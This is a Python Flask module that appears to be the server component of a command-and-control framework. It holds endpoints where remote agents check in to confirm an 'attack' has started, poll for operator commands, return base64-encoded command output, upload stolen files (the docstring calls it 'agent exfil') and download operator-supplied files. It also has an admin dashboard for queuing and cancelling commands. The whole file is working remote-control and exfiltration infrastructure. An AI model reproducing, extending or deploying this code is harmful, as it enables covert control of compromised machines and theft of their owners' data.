from flask import Blueprint, redirect, url_for, jsonify, render_template, request, flash, send_from_directory
import base64
from app.controllers.auth import login_required, admin_required, valid_agent
from app.controllers.commands import cancel, get_all_cmds_by_id, get_unfulfilled, update_response, create_command, get_one_cmd_by_id, get_agent_by_cmd
from app.controllers.agent_files import save_agent_file, agent_file_by_id
from app.config import SecurityConfig
from app import csrf
from app.controllers.agents import get_agent_by_auth_code

# TODO: Separate admin and agent APIs and input into distinct classes and controllers. Tidy up paths.

commands = Blueprint('commands', __name__)

ERROR = {"status": "0"}
OK = {"status": "1"}
NOCOMMANDS = {"status": "no_commands"}
SEND_CMD_ROUTE = "commands.send_command"


@commands.get("/api/agents/command/init")
@csrf.exempt
@valid_agent
def start():
    """Agent checks in to verify start of attack"""
    # TODO: Register check in with server
    # , status=201
    try:
        if SecurityConfig.INIT_ATTACK:
            return jsonify(OK), 200
        else:
            jsonify(ERROR), 500
    except Exception as e:
        print(str(e))


@commands.route("/api/agents/command/all-commands", methods=["GET", "POST"])
@csrf.exempt
@valid_agent
def get_agent_commands():
    """Agent/server command and result exchange"""
    agent = get_agent_by_auth_code(agent_id())
    if request.method == 'POST':
        try:
            for res in request.get_json():
                data = base64.b64decode(res['result']).decode('utf-8')
                saved = update_response(res['id'], data, agent.id)
            return jsonify(OK), 200 if saved else jsonify(ERROR), 500 # ERROR?
        except Exception as e:
            print(str(e))
        return jsonify(ERROR), 500
    else:
        try:
            new_cmds = build_cmds(get_unfulfilled(agent.id))
            if len(new_cmds) != 0:
                return jsonify(new_cmds)
            else:
                return jsonify(NOCOMMANDS), 404
        except Exception as e:
            print(str(e))
        return jsonify(NOCOMMANDS), 404


@commands.route("/api/agents/command/admin-message-by-id", methods=["GET", "POST"])
@login_required
@admin_required
@csrf.exempt
def admin_get_all_agent_commands():
    """Admin interface querying commands by ID"""
    if request.method == 'POST':
        data = request.get_json()
        cid = data['id']
        agent = get_agent_by_cmd(cid)
        if cid is None or cid == "":
            return jsonify(ERROR), 500
        cmd = get_one_cmd_by_id(cid, agent.agent_id)
        if cmd:
            return jsonify({"content": cmd.content}), 200
        else:
            return jsonify(ERROR), 500
    else:
        return jsonify(OK), 200


@commands.route("/api/agents/command/message-by-id", methods=["GET", "POST"])
@valid_agent
@csrf.exempt
def get_all_agent_commands():
    """Agent receives a specific command based on a UUID"""
    agent = get_agent_by_auth_code(agent_id())
    if request.method == 'POST':
        data = request.get_json()
        cid = data['id']
        if cid is None or cid == "":
            return jsonify(ERROR), 500
        cmd = get_one_cmd_by_id(cid, agent)
        if cmd:
            return jsonify(cmd)
        else:
            return jsonify(ERROR), 500
    else:
        return jsonify(OK), 200


@commands.post("/api/agents/command/upload")
@csrf.exempt
@valid_agent
def upload_file():
    """Upload location for agent exfil"""
    agent = get_agent_by_auth_code(agent_id())
    save_path = SecurityConfig.USER_UPLOADS
    try:
        for f in request.files.getlist('file'):
            filename = f.filename.split("\\")[-1]
            if filename != '' and filename is not None:
                save_agent_file(f, save_path, filename, agent.name)
            return jsonify(OK), 200
    except Exception as e:
        print(str(e))


@commands.get("/api/agents/command/download/<string:file_id>")
@csrf.exempt
@valid_agent
def download_file(file_id):
    """Sending files to agent"""
    download_path = SecurityConfig.ADMIN_UPLOADS
    try:
        agent = get_agent_by_auth_code(agent_id())
        file = agent_file_by_id(id=file_id, agent_id=agent.id)
        if file:
            return send_from_directory(download_path, file.name)
        return jsonify(ERROR), 500
    except Exception as e:
        print(str(e))



@commands.route("/dashboard/agents/command/<string:agent_id>", methods=["GET", "POST"])
@login_required
@admin_required
def send_command(agent_id):
    """Add commands for an agent"""
    if request.method == 'POST':
        command = request.form['command']
        if command is None or command == "":
            flash("No command", "error")
            return redirect(url_for(SEND_CMD_ROUTE, agent_id=agent_id))
        if create_command(command, agent_id):
            return redirect(url_for(SEND_CMD_ROUTE, agent_id=agent_id))
        else:
            flash("Failed to save", "error")
            return redirect(url_for(SEND_CMD_ROUTE, agent_id=agent_id))
    else:
        try:
            commands = get_all_cmds_by_id(agent_id)
            return render_template("dashboard/commands.html", commands=commands, agent_id=agent_id)
        except Exception as e:
            print(str(e))
    return render_template("dashboard/commands.html")



@commands.post("/api/command/cancel/<string:cmd_id>")
@csrf.exempt
@login_required
@admin_required
def cancel_command(cmd_id):
    """Cancel commands for an agent"""
    try:
        if cancel(cmd_id):
            return(jsonify(OK), 200)
    except Exception as e:
        print(str(e))
    return(jsonify(ERROR), 500)



def build_cmds(cmds, file_name=None, file_bytes=None):
    new_cmds = []
    for c in cmds:
        cmd = c.command
        if " " in cmd:
            command = cmd.split(" ")[0]
            args = cmd.split(" ")[1:]
        else:
            command = c.command
            args = []
        new_cmds.append({
            "id": c.id,
            "command": command,
            "arguments": args,
            "file_name": file_name,
            "file_bytes": file_bytes
            }
        )
    return new_cmds


def agent_id():
    try:
        return request.headers.get('Authorization')
    except Exception as e:
        print(str(e))